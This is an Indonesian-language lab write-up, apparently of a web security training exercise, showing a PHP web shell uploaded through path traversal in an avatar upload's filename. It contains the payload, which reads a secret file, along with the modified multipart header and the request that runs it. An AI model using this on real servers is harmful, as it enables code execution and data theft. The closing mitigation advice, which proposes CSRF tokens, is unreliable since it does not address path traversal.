# Web shell upload via path traversal

## Background

Terjadi suatu celah upload file yang dimana meskipun web sudah menerapkan sistem yang dimana folder tempat user mengupload file yang seharusnya sudah dibuat tidak dapat mengeksekusi file script akan tetapi user masih dapat mengeksploitasi
celah yang dimana user mengupload file di tempat yang tidak seharusnya dan server mempercayai suatu paramteter bernama fieldname yang  bisa difungsikan untuk menentukan lokasi penyimpanan file yang dari awalnya hanya untuk menentukan nama file.

## Vulnerability Detail
type: Unrestricted File Upload / Improper Content-Type Validation
Saverity: Critical/high
Effect: User can run code execution

## Step to Practice
1. Authentication and Upload
   -login menggunakan user asli
   -cari fitur yang berfungsi untuk mengupload file foto profile
2. Make Script Payload
   buat file bebas yang berekstensi .php contoh exploit.php dengan isi sebagai berikut:
   ```php
   <?php echo file_get_contents('/home/carlos/secret'); ?>
   ```
3. Delivery Payload
   -Upload file exploit.php sambil mengaktifkan fitur intercept di burp suite
   -saat ada request `POST /my-account/avatar` kirim ke repeater dan drop all lalu matikan intercept
   -ubah nilai filename
   ```http
   awal
   Content-Disposition: form-data; name="avatar"; filename="exploit.php"
   menjadi
   Content-Disposition: form-data; name="avatar"; filename="..%2fexploit.php"
   ```
   lalu kirim/send

4. Exploitasi
   - Refresh halaman untuk mentriger kode
   - Cari request `GET /files/avatars/..%2fexploit.php` kirim ke repeater
   - Ubah nilai parameter GET menjadi /files/exploit.php maka akan mentriger kembali kode exploit.php dan menampilkan isinya di response
  
## Mitigasi
Terapkan sanitasi seperti csrf untuk memastikan nilai dari halaman awal hingga akhir cocok tidak diubah sewenang wenang supaya user tidak melakukan hal seperti celah keamanan di lab ini
